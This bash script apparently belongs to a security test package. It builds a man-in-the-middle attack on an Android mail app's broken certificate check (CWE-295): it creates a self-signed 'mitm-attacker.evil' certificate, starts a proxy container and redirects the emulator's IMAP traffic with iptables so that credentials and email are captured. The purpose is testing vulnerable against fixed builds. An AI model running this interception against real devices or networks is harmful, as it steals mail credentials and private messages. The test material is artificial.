#!/usr/bin/env bash
# =============================================================================
# prepare_app.sh — Set up MITM infrastructure for CWE-295 exploitation
# =============================================================================
# Inserts a TLS MITM IMAP proxy between the Android emulator and the real
# mail server. The proxy uses a self-signed certificate that is NOT trusted
# by the system CA store.
#
# On the vulnerable app (checkServerTrusted is a no-op), the connection
# succeeds and the proxy captures IMAP credentials + email content.
#
# On the clean app, the TLS handshake fails because the certificate is
# rejected, and no data is captured.
# =============================================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PREPARE_FILES="$SCRIPT_DIR/prepare_files"

MITM_CONTAINER="thunderbird-mitm"
MITM_PORT=1993
MITM_HTTP_PORT=8082

log(){ printf '[prepare_app] %s\n' "$*"; }

# ── Step 1: Clean up any previous MITM container ─────────────────────────────
log "Removing stale MITM container (if any)..."
docker rm -f "$MITM_CONTAINER" 2>/dev/null || true

# ── Step 2: Generate self-signed certificate for MITM ────────────────────────
CERT_DIR="$SCRIPT_DIR/prepare_files/certs"
mkdir -p "$CERT_DIR"

log "Generating self-signed MITM certificate..."
openssl req -x509 -newkey rsa:2048 \
    -keyout "$CERT_DIR/mitm-key.pem" \
    -out "$CERT_DIR/mitm-cert.pem" \
    -days 1 -nodes \
    -subj "/CN=mitm-attacker.evil" 2>/dev/null

# ── Step 3: Start the MITM proxy container ───────────────────────────────────
log "Starting MITM IMAP proxy container..."
docker run -d \
    --name "$MITM_CONTAINER" \
    --network shared_net \
    -p "${MITM_PORT}:993" \
    -p "${MITM_HTTP_PORT}:8082" \
    -v "$PREPARE_FILES/mitm_imap_proxy.py:/app/proxy.py:ro" \
    -v "$CERT_DIR:/certs:ro" \
    -e REAL_IMAP_HOST=thunderbird-app \
    -e REAL_IMAP_PORT=993 \
    -e LISTEN_PORT=993 \
    -e HTTP_PORT=8082 \
    -e CERT_FILE=/certs/mitm-cert.pem \
    -e KEY_FILE=/certs/mitm-key.pem \
    python:3.11-slim \
    python3 /app/proxy.py

# Wait for the proxy to be ready
sleep 2
if ! docker ps --format '{{.Names}}' | grep -q "$MITM_CONTAINER"; then
    log "ERROR: MITM container failed to start"
    docker logs "$MITM_CONTAINER" 2>&1 | tail -20
    exit 1
fi
log "MITM proxy container is running"

# ── Step 4: Redirect emulator IMAP traffic through the MITM proxy ───────────
# The app connects to 10.0.2.2:993 (host loopback). We use iptables inside
# the emulator to redirect that traffic to 10.0.2.2:MITM_PORT instead.
log "Setting up iptables redirect on emulator (993 → ${MITM_PORT})..."
adb root 2>/dev/null && sleep 2

# Remove any stale rules first
adb shell iptables -t nat -D OUTPUT -p tcp -d 10.0.2.2 --dport 993 \
    -j DNAT --to-destination "10.0.2.2:${MITM_PORT}" 2>/dev/null || true

adb shell iptables -t nat -A OUTPUT -p tcp -d 10.0.2.2 --dport 993 \
    -j DNAT --to-destination "10.0.2.2:${MITM_PORT}"

# Verify the rule is active
log "Verifying iptables NAT rule..."
adb shell iptables -t nat -L OUTPUT -n 2>&1 | while IFS= read -r line; do log "  iptables: $line"; done

# Drop back to non-root for subsequent ADB operations
adb unroot 2>/dev/null || true
sleep 1

log "MITM infrastructure ready"
